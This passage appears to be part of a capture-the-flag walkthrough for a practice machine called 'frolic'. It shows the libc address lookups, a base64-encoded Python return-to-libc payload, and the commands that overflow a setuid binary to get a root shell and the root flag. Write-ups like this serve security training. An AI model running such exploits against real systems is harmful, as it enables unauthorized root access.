+   Notes: system address => 0x0003ada0
+
+
+   www-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep exit
+   Result:
+       112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
+       141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
+       450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
+       558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
+       616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
+       652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
+       876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
+      1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
+      1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
+      1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
+      2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
+      2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
+      2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
+
+
+   Notes: exit address => 0x0002e9d0
+
+   www-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+   Result:
+       0x0015ba0b /bin/sh
+
+   Command-Line: nano buff.py
+   Result:
+      /www/buff.py
+
+   Command-Line: cat buff.py | base64 -w 0
+   Result:
+      aW1wb3J0IHN0cnVjdAoKYnVmZnIgPSAiQSIgKiA1MgpsaWJjID0gMHhiN2UxOTAwMApzeXN0ZW0gPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAzYWRhMCkKZXhpdCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMDJlOWQwKQpiaW5zaCA9IHN0cnVjdC5wYWNrKCc8SScsIGxpYmMgKyAweDAwMTViYTBiKQoKcGF5bG9hZCA9IGJ1ZmZyICsgc3lzdGVtICsgZXhpdCArIGJpbnNoCgpwcmludCBwYXlsb2FkCg==
+
+   Notes: Copied and pasted decoded base64 to: www-data@frolic:/dev/shm/exploit.py
+   www-data@frolic:/dev/shm$ echo -n <base64-code> |base64 -d > exploit.py
+   www-data@frolic:/dev/shm$ cd /home/ayush/.binary/
+   www-data@frolic:/home/ayush/.binary/$ ./rop $(python /dev/shm/exploit.py)
+   Result:
+      *** ROOT ACCESS ***
+      #
+
+   # whoami
+   Result:
+      root
+
+   # cat /root/root.txt
+   Result: 85d3fdf03f969892538ba9a731826222
+      *** ROOT OWNED ***
+
+
+    *** FINISHED ***
